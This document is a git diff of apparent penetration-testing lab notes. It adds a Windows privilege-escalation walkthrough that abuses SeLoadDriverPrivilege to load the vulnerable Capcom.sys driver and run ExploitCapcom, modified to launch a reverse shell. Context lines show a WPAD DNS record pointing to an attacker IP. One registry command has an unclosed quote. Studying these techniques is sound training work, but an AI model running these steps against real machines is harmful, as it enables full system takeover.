@@ -119,12 +119,87 @@ Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreigh
 Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
 ```
 
-<<<<<<< HEAD
-=======
 # Print Operators
 
 `SeLoadDriverPrivilege`
 
+### GUI Way
 [Loading driver Tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
 
->>>>>>> origin/main
+Download it locally and edit it, pasting over the includes below.
+```C#
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+```
+
+Compile Time!!!
+```cmd
+C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+
+Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+EnableSeLoadDriverPrivilege.cpp
+Microsoft (R) Incremental Linker Version 14.28.29913.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+/out:EnableSeLoadDriverPrivilege.exe
+EnableSeLoadDriverPrivilege.obj
+```
+
+[Reference Driver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
+```bash
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys
+
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+
+```powershell
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+```
+
+`EnableSeLoadDriverPrivilege.exe`
+
+```powershell
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+
+.\ExploitCapcom.exe
+```
+
+### Command Line
+Editing line 292 `ExploitCapcom.cpp`.
+```C
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+```
+`CommandLine` string in this example would be changed to
+`TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");`
+
+We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:
+```cmd
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+```
+
+### Clean up
+```cmd
+reg delete HKCU\System\CurrentControlSet\Capcom
+```
